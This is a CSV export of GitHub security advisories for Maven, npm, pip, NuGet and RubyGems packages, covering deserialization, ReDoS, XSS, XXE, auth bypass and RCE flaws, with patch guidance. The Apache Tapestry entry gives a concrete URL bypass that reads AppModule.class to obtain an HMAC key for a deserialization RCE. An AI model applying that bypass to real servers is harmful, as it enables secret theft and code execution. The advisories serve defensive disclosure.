386,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-cmfg-87vq-g5g4,CVE-2019-12814,https://github.com/advisories/GHSA-cmfg-87vq-g5g4,moderate,2019-07-17 15:26:12 UTC,Deserialization of untrusted data in FasterXML jackson-databind,"A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.x through 2.9.9. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has JDOM 1.x or 2.x jar in the classpath, an attacker can send a specifically crafted JSON message that allows them to read arbitrary local files on the server.",maven
387,34530,com.mchange:c3p0,GHSA-84p2-vf58-xhxv,CVE-2019-5427,https://github.com/advisories/GHSA-84p2-vf58-xhxv,high,2019-04-23 16:03:18 UTC,Billion laughs attack in c3p0,c3p0 version < 0.9.5.4 may be exploited by a billion laughs attack when loading XML configuration due to missing protections against recursive entity expansion when loading configuration.,maven
388,16103,redis,GHSA-35q2-47q7-3pc3,CVE-2021-29469,https://github.com/advisories/GHSA-35q2-47q7-3pc3,high,2021-04-27 15:56:03 UTC,Node-Redis potential exponential regex in monitor mode,"### Impact
When a client is in monitoring mode, the regex begin used to detected monitor messages could cause exponential backtracking on some strings. This issue could lead to a denial of service.

### Patches
The problem was fixed in commit [`2d11b6d`](https://github.com/NodeRedis/node-redis/commit/2d11b6dc9b9774464a91fb4b448bad8bf699629e) and was released in version `3.1.1`.

### References
#1569 (GHSL-2021-026)",npm
389,19842,urllib3,GHSA-hmv2-79q8-fv6g,CVE-2020-7212,https://github.com/advisories/GHSA-hmv2-79q8-fv6g,high,2021-04-30 17:31:43 UTC,Uncontrolled Resource Consumption in urllib3,"The _encode_invalid_chars function in util/url.py in the urllib3 library 1.25.2 through 1.25.7 for Python allows a denial of service (CPU consumption) because of an inefficient algorithm. The percent_encodings array contains all matches of percent encodings. It is not deduplicated. For a URL of length N, the size of percent_encodings may be up to O(N). The next step (normalize existing percent-encoded bytes) also takes up to O(N) for each step, so the total time is O(N^2). If percent_encodings were deduplicated, the time to compute _encode_invalid_chars would be O(kN), where k is at most 484 ((10+6*2)^2).",pip
390,34505,org.glassfish.jersey.core:jersey-common,GHSA-c43q-5hpj-4crv,CVE-2021-28168,https://github.com/advisories/GHSA-c43q-5hpj-4crv,moderate,2021-04-23 16:55:01 UTC,Local information disclosure via system temporary directory,"## Impact
Eclipse Jersey 2.28 - 2.33 and Eclipse Jersey 3.0.0 - 3.0.1 contains a local information disclosure vulnerability. This is due to the use of the `File.createTempFile` which creates a file inside of the system temporary directory with the permissions: `-rw-r--r--`. Thus the contents of this file are viewable by all other users locally on the system. As such, if the contents written is security sensitive, it can be disclosed to other local users.

## Workaround

This issue can be mitigated by manually setting the `java.io.tmpdir` system property when launching the JVM.

## Patches

Jersey 2.34 and 3.0.2 forward sets the correct permissions on the temporary file created by Jersey.

### References
 
 - https://github.com/eclipse-ee4j/jersey/pull/4712
 - [CWE-378: Creation of Temporary File With Insecure Permissions](https://cwe.mitre.org/data/definitions/378.html)
 - [CWE-379: Creation of Temporary File in Directory with Insecure Permissions](https://cwe.mitre.org/data/definitions/379.html)

## Similar Vulnerabilities

Similar, but not the same:

 - JUnit 4 - https://github.com/junit-team/junit4/security/advisories/GHSA-269g-pwp5-87pp
 - Google Guava - https://github.com/google/guava/issues/4011
 - Apache Ant - https://nvd.nist.gov/vuln/detail/CVE-2020-1945
 - JetBrains Kotlin Compiler - https://nvd.nist.gov/vuln/detail/CVE-2020-15824
 - Eclipse Jetty - https://github.com/eclipse/jetty.project/security/advisories/GHSA-g3wg-6mcf-8jj6


---

Original Disclosure:

> Hello Jersey Security Team,
> 
> Utilizing a custom CodeQL query written as a part of the [GitHub Security Lab](https://securitylab.github.com/) [Bug Bounty program](https://securitylab.github.com/bounties), I've unearthed a local temporary file information disclosure vulnerability.
> 
> You can see the custom CodeQL query utilized here:
> https://lgtm.com/query/8831016213790320486/
> 
> This particular vulnerability exists because on unix-like systems (not including modern versions of MacOS) the system temporary directory is shared between all users. As such, failure to correctly set file permissions and/or verify exclusive creation of directories can lead to either local information disclosure, or local file hijacking by another user.
> 
> This vulnerability impacts the following locations in this project's source:
> 
>  - https://github.com/eclipse-ee4j/jersey/blob/01c6a32a2064aeff2caa8133472e33affeb8a29a/core-common/src/main/java/org/glassfish/jersey/message/internal/FileProvider.java#L64-L73
>  - https://github.com/eclipse-ee4j/jersey/blob/01c6a32a2064aeff2caa8133472e33affeb8a29a/media/multipart/src/main/java/org/glassfish/jersey/media/multipart/internal/FormDataParamValueParamProvider.java#L202-L208
> 
> This vulnerability exists because of the vulnerability in the `Utils.createTempFile`:
> 
> https://github.com/eclipse-ee4j/jersey/blob/01c6a32a2064aeff2caa8133472e33affeb8a29a/core-common/src/main/java/org/glassfish/jersey/message/internal/Utils.java#L42-L53
> 
> This is because `File.createTempFile` creates a file inside of the system temporary directory with the permissions: `-rw-r--r--`. Thus the contents of this file are viewable by all other users locally on the system.
> 
> If there is sensitive information written to these files, it is disclosed to other local users on this system.
> 
> The fix for this vulnerability is to use the `Files` API (instead of the `File` API) to create temporary files/directories as this new API correctly sets the posix file permissions.",maven
391,37107,com.vaadin:flow-client,GHSA-6hgr-2g6q-3rmc,,https://github.com/advisories/GHSA-6hgr-2g6q-3rmc,moderate,2021-04-22 16:11:26 UTC,Server session is not invalidated when logout() helper method of Authentication module is used in Vaadin 18-19,"`Authentication.logout()` helper in `com.vaadin:flow-client` versions 5.0.0 prior to 6.0.0 (Vaadin 18), and 6.0.0 through 6.0.4 (Vaadin 19.0.0 through 19.0.3) uses incorrect HTTP method, which, in combination with Spring Security CSRF protection, allows local attackers to access Fusion endpoints after the user attempted to log out.

- https://vaadin.com/security/cve-2021-31408",maven
392,36041,org.apache.shiro:shiro-spring,GHSA-7cj4-gj8m-m2f7,CVE-2020-17510,https://github.com/advisories/GHSA-7cj4-gj8m-m2f7,critical,2021-04-22 16:13:23 UTC,Authentication bypass in Apache Shiro,"Apache Shiro before 1.7.0, when using Apache Shiro with Spring, a specially crafted HTTP request may cause an authentication bypass.",maven
393,36292,org.apache.calcite:calcite-core,GHSA-hxp5-8pgq-mgv9,CVE-2020-13955,https://github.com/advisories/GHSA-hxp5-8pgq-mgv9,moderate,2021-04-22 16:14:14 UTC,Missing Authentication for Critical Function in Apache Calcite,"""HttpUtils#getURLConnection method disables explicitly hostname verification for HTTPS connections making clients vulnerable to man-in-the-middle attacks. Calcite uses this method internally to connect with Druid and Splunk so information leakage may happen when using the respective Calcite adapters. The method itself is in a utility class so people may use it to create vulnerable HTTPS connections for other applications. From Apache Calcite 1.26 onwards, the hostname verification will be performed using the default JVM truststore.""",maven
394,34275,org.mybatis:mybatis,GHSA-qq48-m4jx-xqh8,CVE-2020-26945,https://github.com/advisories/GHSA-qq48-m4jx-xqh8,high,2021-04-22 16:14:38 UTC,"""Deserialization errors in MyBatis""",MyBatis before 3.5.6 mishandles deserialization of object streams leading to potential cache poisoning.,maven
395,30143,petl,GHSA-69q2-p9xp-739v,CVE-2020-29128,https://github.com/advisories/GHSA-69q2-p9xp-739v,critical,2021-04-20 16:32:08 UTC,XML Injection in petl,"petl before 1.68, in some configurations, allows resolution of entities in an XML document.",pip
396,17138,mathjs,GHSA-x2fc-mxcx-w4mf,CVE-2020-7743,https://github.com/advisories/GHSA-x2fc-mxcx-w4mf,high,2021-05-10 18:39:04 UTC,Prototype Pollution in mathjs,The package mathjs before 7.5.1 are vulnerable to Prototype Pollution via the deepExtend function that runs upon configuration updates.,npm
397,13209,System.Text.Encodings.Web,GHSA-ghhp-997w-qr28,CVE-2021-26701,https://github.com/advisories/GHSA-ghhp-997w-qr28,critical,2021-04-21 19:38:01 UTC,.NET Core Remote Code Execution Vulnerability,".NET Core Remote Code Execution Vulnerability This CVE ID is unique from CVE-2021-24112.

### Executive summary

Microsoft is releasing this security advisory to provide information about a vulnerability in .NET 5.0, .NET Core 3.1, and .NET Core 2.1. This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.

A remote code execution vulnerability exists in .NET 5 and .NET Core due to how text encoding is performed.

### Discussion

Discussion for this issue can be found at dotnet/runtime#49377

### Mitigation factors

Microsoft has not identified any mitigating factors for this vulnerability.

### Affected software

The vulnerable package is `System.Text.Encodings.Web` . Upgrading your package and redeploying your app should be sufficient to address this vulnerability.

Vulnerable package versions:

Any .NET 5, .NET Core, or .NET Framework based application that uses the System.Text.Encodings.Web package with a vulnerable version listed below.

Package Name | Vulnerable Versions | Secure Versions
-|-|-
System.Text.Encodings.Web | 4.0.0 - 4.5.0 | 4.5.1
System.Text.Encodings.Web |  4.6.0-4.7.1 | 4.7.2
System.Text.Encodings.Web | 5.0.0 |  5.0.1


Please validate that each of the .NET versions you are using is in support. Security updates are only provided for supported .NET versions.

",nuget
398,12860,System.Net.Http,GHSA-7jgj-8wvc-jh57,CVE-2018-8292,https://github.com/advisories/GHSA-7jgj-8wvc-jh57,high,2021-04-21 19:16:06 UTC,.NET Core Information Disclosure,"An information disclosure vulnerability exists in .NET Core when authentication information is inadvertently exposed in a redirect, aka "".NET Core Information Disclosure Vulnerability."" This affects .NET Core 2.1, .NET Core 1.0, .NET Core 1.1, PowerShell Core 6.0.",nuget
399,16488,codemirror,GHSA-4gw3-8f77-f72c,CVE-2020-7760,https://github.com/advisories/GHSA-4gw3-8f77-f72c,moderate,2021-05-10 18:46:27 UTC,Regular expression denial of service in codemirror,"This affects the package codemirror before 5.58.2; the package org.apache.marmotta.webjars:codemirror before 5.58.2.
 The vulnerable regular expression is located in https://github.com/codemirror/CodeMirror/blob/cdb228ac736369c685865b122b736cd0d397836c/mode/javascript/javascript.jsL129. The ReDOS vulnerability of the regex is mainly due to the sub-pattern (s|/*.*?*/)*",npm
400,20810,apache-airflow,GHSA-hhx9-p69v-cx2j,CVE-2020-13927,https://github.com/advisories/GHSA-hhx9-p69v-cx2j,critical,2021-04-30 17:34:13 UTC,Authentication bypass in Apache Airflow,"""The previous default setting for Airflow's Experimental API was to allow all API requests without authentication, but this poses security risks to users who miss this fact. From Airflow 1.10.11 the default has been changed to deny all requests by default and is documented at https://airflow.apache.org/docs/1.10.11/security.html#api-authentication. Note this change fixes it for new installs but existing users need to change their config to default `[api]auth_backend = airflow.api.auth.backend.deny_all` as mentioned in the Updating Guide: https://github.com/apache/airflow/blob/1.10.11/UPDATING.md#experimental-api-will-deny-all-request-by-default""",pip
401,18933,oauth,GHSA-7359-3c6r-hfc2,CVE-2016-11086,https://github.com/advisories/GHSA-7359-3c6r-hfc2,high,2021-04-22 16:22:15 UTC,Improper Certificate Validation in oauth ruby gem,"lib/oauth/consumer.rb in the oauth-ruby gem through 0.5.4 for Ruby does not verify server X.509 certificates if a certificate bundle cannot be found, which allows man-in-the-middle attackers to spoof servers and obtain sensitive information.",rubygems
402,16726,chart.js,GHSA-h68q-55jf-x68w,CVE-2020-7746,https://github.com/advisories/GHSA-h68q-55jf-x68w,high,2021-05-10 18:47:53 UTC,Prototype pollution in chart.js,"This affects the package chart.js before 2.9.4. The options parameter is not properly sanitized when it is processed. When the options are processed, the existing options (or the defaults options) are deeply merged with provided options. However, during this operation, the keys of the object being set are not checked, leading to a prototype pollution.",npm
403,20021,rsa,GHSA-xrx6-fmxq-rjj2,CVE-2020-25658,https://github.com/advisories/GHSA-xrx6-fmxq-rjj2,moderate,2021-04-30 17:35:15 UTC,Timing attacks in python-rsa,It was found that python-rsa is vulnerable to Bleichenbacher timing attacks. An attacker can use this flaw via the RSA decryption API to decrypt parts of the cipher text encrypted with RSA.,pip
404,34809,io.vertx:vertx-web,GHSA-9q69-g5gc-9fgf,CVE-2020-35217,https://github.com/advisories/GHSA-9q69-g5gc-9fgf,high,2021-04-22 16:16:18 UTC,Cross-Site Request Forgery in Vert.x-Web framework,"Vert.x-Web framework v4.0 milestone 1-4 does not perform a correct CSRF verification. Instead of comparing the CSRF token in the request with the CSRF token in the cookie, it compares the CSRF token in the cookie against a CSRF token that is stored in the session. An attacker does not even need to provide a CSRF token in the request because the framework does not consider it. The cookies are automatically sent by the browser and the verification will always succeed, leading to a successful CSRF attack.",maven
405,37675,org.bouncycastle:bcprov-jdk14,GHSA-72m5-fvvv-55m6,CVE-2020-26939,https://github.com/advisories/GHSA-72m5-fvvv-55m6,moderate,2021-04-22 16:16:49 UTC,Observable Differences in Behavior to Error Inputs in Bouncy Castle,"In Legion of the Bouncy Castle BC before 1.55 and BC-FJA before 1.0.2, attackers can obtain sensitive information about a private exponent because of Observable Differences in Behavior to Error Inputs. This occurs in org.bouncycastle.crypto.encodings.OAEPEncoding. Sending invalid ciphertext that decrypts to a short payload in the OAEP Decoder could result in the throwing of an early exception, potentially leaking some information about the private exponent of the RSA private key performing the encryption.",maven
406,19858,Pygments,GHSA-9w8r-397f-prfh,CVE-2021-20270,https://github.com/advisories/GHSA-9w8r-397f-prfh,high,2021-04-20 16:35:47 UTC,Infinite Loop in Pygments,"An infinite loop in SMLLexer in Pygments versions 1.5 to 2.7.3 may lead to denial of service when performing syntax highlighting of a Standard ML (SML) source file, as demonstrated by input that only contains the ""exception"" keyword.",pip
407,18424,sockjs,GHSA-c9g6-9335-x697,CVE-2020-7693,https://github.com/advisories/GHSA-c9g6-9335-x697,moderate,2021-04-13 15:27:51 UTC,Improper Input Validation in SocksJS-Node,Incorrect handling of Upgrade header with the value websocket leads in crashing of containers hosting sockjs apps. This affects the package sockjs before 0.3.20.,npm
408,17028,grpc,GHSA-pp75-xfpw-37g9,CVE-2020-7768,https://github.com/advisories/GHSA-pp75-xfpw-37g9,high,2021-05-10 19:16:14 UTC,Prototype pollution in grpc and @grpc/grpc-js,"""The package grpc before 1.24.4 and the package @grpc/grpc-js before 1.1.8 are vulnerable to Prototype Pollution via loadPackageDefinition.""",npm
409,16278,nodemailer,GHSA-48ww-j4fc-435p,CVE-2020-7769,https://github.com/advisories/GHSA-48ww-j4fc-435p,critical,2021-05-10 19:16:52 UTC,Command injection in nodemailer,This affects the package nodemailer before 6.4.16. Use of crafted recipient email addresses may result in arbitrary command flag injection in sendmail transport for sending mails.,npm
410,34929,org.apache.tapestry:tapestry-core,GHSA-mj8x-cpr8-x39h,CVE-2021-27850,https://github.com/advisories/GHSA-mj8x-cpr8-x39h,critical,2021-06-16 17:33:19 UTC,Remote code execution in Apache Tapestry,"A critical unauthenticated remote code execution vulnerability was found all recent versions of Apache Tapestry. The affected versions include 5.4.5, 5.5.0, 5.6.2 and 5.7.0. The vulnerability I have found is a bypass of the fix for CVE-2019-0195. Recap: Before the fix of CVE-2019-0195 it was possible to download arbitrary class files from the classpath by providing a crafted asset file URL. An attacker was able to download the file `AppModule.class` by requesting the URL `http://localhost:8080/assets/something/services/AppModule.class` which contains a HMAC secret key. The fix for that bug was a blacklist filter that checks if the URL ends with `.class`, `.properties` or `.xml`. Bypass: Unfortunately, the blacklist solution can simply be bypassed by appending a `/` at the end of the URL: `http://localhost:8080/assets/something/services/AppModule.class/` The slash is stripped after the blacklist check and the file `AppModule.class` is loaded into the response. This class usually contains the HMAC secret key which is used to sign serialized Java objects. With the knowledge of that key an attacker can sign a Java gadget chain that leads to RCE (e.g. CommonsBeanUtils1 from ysoserial). Solution for this vulnerability: * For Apache Tapestry 5.4.0 to 5.6.2, upgrade to 5.6.3 or later. * For Apache Tapestry 5.7.0, upgrade to 5.7.1 or later.",maven
411,20088,wagtail,GHSA-wq5h-f9p5-q7fx,CVE-2021-29434,https://github.com/advisories/GHSA-wq5h-f9p5-q7fx,moderate,2021-04-20 14:02:30 UTC,Improper validation of URLs ('Cross-site Scripting') in Wagtail rich text fields,"### Impact
When saving the contents of a rich text field in the admin interface, Wagtail does not apply server-side checks to ensure that link URLs use a valid protocol. A malicious user with access to the admin interface could thus craft a POST request to publish content with `javascript:` URLs containing arbitrary code. The vulnerability is not exploitable by an ordinary site visitor without access to the Wagtail admin.

### Patches
Patched versions have been released as Wagtail 2.11.7 (for the LTS 2.11 branch) and Wagtail 2.12.4 (for the current 2.12 branch).

### Workarounds
For sites that cannot easily upgrade to a current supported version, the vulnerability can be patched by adding the following code to a `wagtail_hooks.py` module in any installed app:

```python
from draftjs_exporter.dom import DOM
from wagtail.admin.rich_text.converters.html_to_contentstate import ExternalLinkElementHandler, PageLinkElementHandler
from wagtail.core import hooks
from wagtail.core.whitelist import check_url


def link_entity(props):
    id_ = props.get('id')
    link_props = {}

    if id_ is not None:
        link_props['linktype'] = 'page'
        link_props['id'] = id_
    else:
        link_props['href'] = check_url(props.get('url'))

    return DOM.create_element('a', link_props, props['children'])


@hooks.register('register_rich_text_features', order=1)
def register_link(features):
    features.register_converter_rule('contentstate', 'link', {
        'from_database_format': {
            'a[href]': ExternalLinkElementHandler('LINK'),
            'a[linktype=""page""]': PageLinkElementHandler('LINK'),
        },
        'to_database_format': {
            'entity_decorators': {'LINK': link_entity}
        }
    })
```

### Acknowledgements
Many thanks to Kevin Breen for reporting this issue.

### For more information
If you have any questions or comments about this advisory:

* Visit Wagtail's [support channels](https://docs.wagtail.io/en/stable/support.html)
* Email us at security@wagtail.io (if you wish to send encrypted email, the public key ID is `0x6ba1e1a86e0f8ce8`)",pip
412,30443,vyper,GHSA-375m-5fvv-xq23,,https://github.com/advisories/GHSA-375m-5fvv-xq23,low,2021-04-19 15:11:54 UTC,VVE-2021-0002: Incorrect `returndatasize` when using simple forwarder proxies deployed prior to EIP-1167 adoption,"## Background

@tjayrush reported a data handling issue with certain Web3 libraries using Vyper-deploy forwarder proxy contracts using our Vyper's built-in `create_forwarder_to` function prior to our change to support EIP-1167 style forwarder proxies.

### Impact
If you are an end user of a forwarder-style proxy deployed using Vyper's built-in `create_forwarder_to` function AND you have a function that returns >4096 bytes AND you do no return data sanitation on the value returned, you could potentially see a data corruption issue.

Otherwise, if you are handling the result of a return call AND you expect a specific `RETURNDATASIZE` that is less than 4096 (such as `SafeERC20.safeTransfer`) then the call will fail that check.

### Patches
The issue was patched when we upgraded to EIP-1167 style forwarder proxies in #2281.

### Workarounds
If you are making a call to a contract method that is expected to return <= 4096 bytes, there is no issue as the ABI decoders in both Solidity and Vyper will truncate the data properly. Web3 libraries will also do this, unless you are doing `eth_call` or `eth_sendTransaction` directly.

If you are using a Solidity library that checks `RETURNDATASIZE` of an external call to a forwarder proxy deployed prior to this patch, it will fail on that assertion (such as `SafeERC20.safeTransfer`). The workaround is to always do a greater than or equal to check, rather than a strict equals to check.",pip
413,35281,com.vaadin:vaadin-server,GHSA-q74r-4xw3-ppx9,CVE-2019-25028,https://github.com/advisories/GHSA-q74r-4xw3-ppx9,moderate,2021-04-19 14:49:48 UTC,Stored cross-site scripting in Grid component in Vaadin 7 and 8,"Missing variable sanitization in `Grid` component in `com.vaadin:vaadin-server` versions 7.4.0 through 7.7.19 (Vaadin 7.4.0 through 7.7.19), and 8.0.0 through 8.8.4 (Vaadin 8.0.0 through 8.8.4) allows attacker to inject malicious JavaScript via unspecified vector.

- https://vaadin.com/security/cve-2019-25028",maven
414,35281,com.vaadin:vaadin-server,GHSA-42j4-733x-5vcf,CVE-2020-36320,https://github.com/advisories/GHSA-42j4-733x-5vcf,high,2021-04-19 14:49:32 UTC,Regular expression denial of service (ReDoS) in EmailValidator class in Vaadin 7,"Unsafe validation RegEx in `EmailValidator` class in `com.vaadin:vaadin-server` versions 7.0.0 through 7.7.21 (Vaadin 7.0.0 through 7.7.21) allows attackers to cause uncontrolled resource consumption by submitting malicious email addresses.

- https://vaadin.com/security/cve-2020-36320",maven
415,35281,com.vaadin:vaadin-server,GHSA-75xc-qvxh-27f8,CVE-2021-31403,https://github.com/advisories/GHSA-75xc-qvxh-27f8,moderate,2021-04-19 14:51:06 UTC,Timing side channel vulnerability in UIDL request handler in Vaadin 7 and 8,"Non-constant-time comparison of CSRF tokens in UIDL request handler in `com.vaadin:vaadin-server` versions 7.0.0 through 7.7.23 (Vaadin 7.0.0 through 7.7.23), and 8.0.0 through 8.12.2 (Vaadin 8.0.0 through 8.12.2) allows attacker to guess a security token via timing attack

- https://vaadin.com/security/cve-2021-31403",maven
416,30443,vyper,GHSA-22wc-c9wj-6q2v,,https://github.com/advisories/GHSA-22wc-c9wj-6q2v,moderate,2021-04-19 15:12:05 UTC,VVE-2021-0001: Memory corruption using function calls within arrays,"### Impact
When performing a function call inside an array, there is a memory corruption issue that occurs because of an incorrect pointer to the the tip of the stack.

### Patches
This issue was partially fixed in [VVE-2020-0004](https://github.com/vyperlang/vyper/security/advisories/GHSA-2r3x-4mrv-mcxf), however the fix did not update similar code for arrays, which had a similar issue. The issue is fully fixed in https://github.com/vyperlang/vyper/pull/2345",pip
417,20348,asyncpg,GHSA-2xpj-f5g2-8p7m,CVE-2020-17446,https://github.com/advisories/GHSA-2xpj-f5g2-8p7m,high,2021-04-20 16:30:51 UTC,Access of Uninitialized Pointer,"asyncpg before 0.21.0 allows a malicious PostgreSQL server to trigger a crash or execute arbitrary code (on a database client) via a crafted server response, because of access to an uninitialized pointer in the array data decoder.",pip
418,20671,django-debug-toolbar,GHSA-pghf-347x-c2gj,CVE-2021-30459,https://github.com/advisories/GHSA-pghf-347x-c2gj,high,2021-04-16 19:53:28 UTC,SQL Injection via in django-debug-toolbar,"### Impact
With Django Debug Toolbar attackers are able to execute SQL by changing the `raw_sql` input of the SQL explain, analyze or select forms and submitting the form.

**NOTE:** This is a high severity issue for anyone using the toolbar in a **production environment**.

Generally the Django Debug Toolbar team only maintains the latest version of django-debug-toolbar, but an exception was made because of the high severity of this issue.

### Patches
Please upgrade to one of the following versions, depending on the major version you're using:

- Version 1.x: [django-debug-toolbar 1.11.1](https://pypi.org/project/django-debug-toolbar/1.11.1/)
- Version 2.x: [django-debug-toolbar 2.2.1](https://pypi.org/project/django-debug-toolbar/2.2.1/)
- Version 3.x: [django-debug-toolbar 3.2.1](https://pypi.org/project/django-debug-toolbar/3.2.1/)

### For more information
If you have any questions or comments about this advisory:
* Open an issue in the [django-debug-toolbar repo](https://github.com/jazzband/django-debug-toolbar/issues/new)  (Please NO SENSITIVE INFORMATION, send an email instead!)
* Email us at [security@jazzband.co](mailto:security@jazzband.co)",pip
419,18424,sockjs,GHSA-hh8v-jmh3-9437,CVE-2020-8823,https://github.com/advisories/GHSA-hh8v-jmh3-9437,moderate,2021-04-13 15:25:33 UTC,Cross-site scripting in SocksJS-node,htmlfile in lib/transport/htmlfile.js in SockJS before 0.3.0 is vulnerable to Reflected XSS via the /htmlfile c (aka callback) parameter.,npm
420,16013,handlebars,GHSA-f2jv-r9rf-7988,CVE-2021-23369,https://github.com/advisories/GHSA-f2jv-r9rf-7988,critical,2021-05-06 15:57:44 UTC,Remote code execution in handlebars when compiling templates,The package handlebars before 4.7.7 are vulnerable to Remote Code Execution (RCE) when selecting certain compiling options to compile templates coming from an untrusted source.,npm
421,18778,jsrsasign,GHSA-27fj-mc8w-j9wg,CVE-2021-30246,https://github.com/advisories/GHSA-27fj-mc8w-j9wg,critical,2021-04-16 19:52:35 UTC,RSA signature validation vulnerability on maleable encoded message in jsrsasign,"### Impact
Vulnerable jsrsasign will accept RSA signature with improper PKCS#1.5 padding.
Decoded RSA signature value consists following form:
01(ff...(8 or more ffs)...ff)00[ASN.1 OF DigestInfo]
Its byte length shall be the same as RSA key length however such checking was not sufficient.

To make crafted message for practical attack is very hard.

### Patches
Users validating RSA signature should upgrade to 10.2.0 or later.

### Workarounds
There is no workaround. Not to use RSA signature validation in jsrsasign.

### ACKNOWLEDGEMENT
Thanks to Daniel Yahyazadeh @yahyazadeh for reporting and analyzing this vulnerability.",npm
422,13397,UmbracoCms,GHSA-4vp3-vfww-8648,CVE-2020-29454,https://github.com/advisories/GHSA-4vp3-vfww-8648,moderate,2021-04-13 15:48:05 UTC,Incorrect permission enforcement in UmbracoCms,Editors/LogViewerController.cs in Umbraco through 8.9.1 allows a user to visit a logviewer endpoint even if they lack Applications.Settings access.,nuget
423,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-gwp4-hfv6-p7hw,CVE-2019-14439,https://github.com/advisories/GHSA-gwp4-hfv6-p7hw,high,2019-08-01 19:18:06 UTC,Deserialization of untrusted data in FasterXML jackson-databind,A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.x before 2.9.9.2. This occurs when Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has the logback jar in the classpath.,maven
424,28855,invenio-records,GHSA-vxh3-mvv7-265j,CVE-2019-1020003,https://github.com/advisories/GHSA-vxh3-mvv7-265j,moderate,2019-07-16 00:52:15 UTC,Cross-site scripting invenio-records,"## Cross-Site Scripting (XSS) vulnerability in administration interface

### Impact
A Cross-Site Scripting (XSS) vulnerability was discovered when rendering JSON for a record in the administration interface. The vulnerability could be exploited by e.g. a user who had access to upload a new record, that an admin user would then later view in the admin interface.

### Patches
All supported versions of Invenio-Records have been patched. You should upgrade to either v1.0.1, v1.1.1 or v1.2.2

### For more information
If you have any questions or comments about this advisory:
* Email us at [info@inveniosoftware.org](mailto:info@inveniosoftware.org)",pip
425,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-q4hg-rmq2-52q9,CVE-2019-10072,https://github.com/advisories/GHSA-q4hg-rmq2-52q9,moderate,2019-06-26 01:09:40 UTC,Improper Locking in Apache Tomcat,The fix for CVE-2019-0199 was incomplete and did not address HTTP/2 connection window exhaustion on write in Apache Tomcat versions 9.0.0.M1 to 9.0.19 and 8.5.0 to 8.5.40 . By not sending WINDOW_UPDATE messages for the connection window (stream 0) clients were able to cause server-side threads to block eventually leading to thread exhaustion and a DoS.,maven
426,19962,py,GHSA-hj5v-574p-mj7c,CVE-2020-29651,https://github.com/advisories/GHSA-hj5v-574p-mj7c,high,2021-04-20 16:39:57 UTC,Regular expression deinal of service in py,A denial of service via regular expression in the py.path.svnwc component of py (aka python-py) through 1.9.0 could be used by attackers to cause a compute-time denial of service attack by supplying malicious input to the blame functionality.,pip
427,20810,apache-airflow,GHSA-7mx5-x372-xh87,CVE-2020-17526,https://github.com/advisories/GHSA-7mx5-x372-xh87,high,2021-04-20 16:40:27 UTC,Incorrect Session Validation in Apache Airflow,"Incorrect Session Validation in Apache Airflow Webserver versions prior to 1.10.14 with default config allows a malicious airflow user on site A where they log in normally, to access unauthorized Airflow Webserver on Site B through the session from Site A. This does not affect users who have changed the default value for `[webserver] secret_key` config.",pip
428,19832,Django,GHSA-xgxc-v2qg-chmh,CVE-2021-28658,https://github.com/advisories/GHSA-xgxc-v2qg-chmh,moderate,2021-04-08 18:11:48 UTC,Directory Traversal in Django,"In Django 2.2 before 2.2.20, 3.0 before 3.0.14, and 3.1 before 3.1.8, MultiPartParser allowed directory traversal via uploaded files with suitably crafted file names. Built-in upload handlers were not affected by this vulnerability.",pip
429,19282,puppet,GHSA-gqvf-892r-vjm5,CVE-2020-7942,https://github.com/advisories/GHSA-gqvf-892r-vjm5,moderate,2021-04-13 15:42:19 UTC,Improper Certificate Validation in Puppet,"Previously, Puppet operated on a model that a node with a valid certificate was entitled to all information in the system and that a compromised certificate allowed access to everything in the infrastructure. When a node's catalog falls back to the `default` node, the catalog can be retrieved for a different node by modifying facts for the Puppet run. This issue can be mitigated by setting `strict_hostname_checking = true` in `puppet.conf` on your Puppet master. Puppet 6.13.0 changes the default behavior for strict_hostname_checking from false to true. It is recommended that Puppet Open Source and Puppet Enterprise users that are not upgrading still set strict_hostname_checking to true to ensure secure behavior.",rubygems
430,20100,autobahn,GHSA-gwp7-vqr5-h33h,CVE-2020-35678,https://github.com/advisories/GHSA-gwp7-vqr5-h33h,moderate,2021-04-20 16:13:45 UTC,Open Redirect in autobahn,Autobahn|Python before 20.12.3 allows redirect header injection.,pip
431,20092,ansible,GHSA-vcg8-98q8-g7mj,CVE-2020-1740,https://github.com/advisories/GHSA-vcg8-98q8-g7mj,low,2021-04-07 21:47:31 UTC,Exposure of Sensitive Information to an Unauthorized Actor and Insecure Temporary File in Ansible,"A flaw was found in Ansible Engine when using Ansible Vault for editing encrypted files. When a user executes ""ansible-vault edit"", another user on the same computer can read the old and new secret, as it is created in a temporary file with mkstemp and the returned file descriptor is closed and the method write_data is called to write the existing secret in the file. This method will delete the file before recreating it insecurely. All versions in 2.7.x, 2.8.x and 2.9.x branches are believed to be vulnerable.",pip
432,19975,bottle,GHSA-qhx9-7hx7-cp4r,CVE-2020-28473,https://github.com/advisories/GHSA-qhx9-7hx7-cp4r,moderate,2021-04-07 21:05:21 UTC,HTTP Request smuggling in bottle,"The package bottle before 0.12.19 are vulnerable to Web Cache Poisoning by using a vector called parameter cloaking. When the attacker can separate query parameters using a semicolon (;), they can cause a difference in the interpretation of the request between the proxy (running with default configuration) and the server. This can result in malicious requests being cached as completely safe ones, as the proxy would usually not see the semicolon as a separator, and therefore would not include it in a cache key of an unkeyed parameter.",pip
433,20276,Plone,GHSA-wq6x-g685-w5f2,CVE-2020-28734,https://github.com/advisories/GHSA-wq6x-g685-w5f2,high,2021-04-07 21:13:00 UTC,Improper Restriction of XML External Entity Reference in Plone,Plone before 5.2.3 allows XXE attacks via a feature that is explicitly only available to the Manager role.,pip
434,20276,Plone,GHSA-2c8c-84w2-j38j,CVE-2020-28736,https://github.com/advisories/GHSA-2c8c-84w2-j38j,high,2021-04-07 21:14:00 UTC,Improper Restriction of XML External Entity Reference in Plone,"Plone before 5.2.3 allows XXE attacks via a feature that is protected by an unapplied permission of plone.schemaeditor.ManageSchemata (therefore, only available to the Manager role).",pip
435,20276,Plone,GHSA-x7wf-5mjc-6x76,CVE-2020-28735,https://github.com/advisories/GHSA-x7wf-5mjc-6x76,high,2021-04-07 21:13:44 UTC,SSRF attacks via tracebacks in Plone,Plone before 5.2.3 allows SSRF attacks via the tracebacks feature (only available to the Manager role).,pip
